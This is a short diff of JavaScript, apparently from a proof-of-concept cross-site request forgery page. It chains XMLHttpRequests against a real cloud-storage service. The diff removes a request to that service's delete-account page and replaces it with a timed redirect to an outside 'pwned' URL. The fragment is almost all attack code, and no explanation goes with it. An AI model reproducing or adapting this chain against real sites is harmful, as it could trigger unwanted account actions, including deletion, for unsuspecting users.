@@ -19,9 +19,7 @@ var xhr = new XMLHttpRequest();
                 xhr2.onload = function(e){
                     if( xhr2.readyState == XMLHttpRequest.DONE && xhr2.status == 200 )
                     {
-                        var xhr3 = new XMLHttpRequest();
-                        xhr3.open("GET", "https://www.backblaze.com/delete-account.html", true);
-                        xhr3.send(null);
+                        setTimeout(function(){ window.location.href="https://zonduu.me/pwned"; }, 2000);;
                     }
                 }
         }
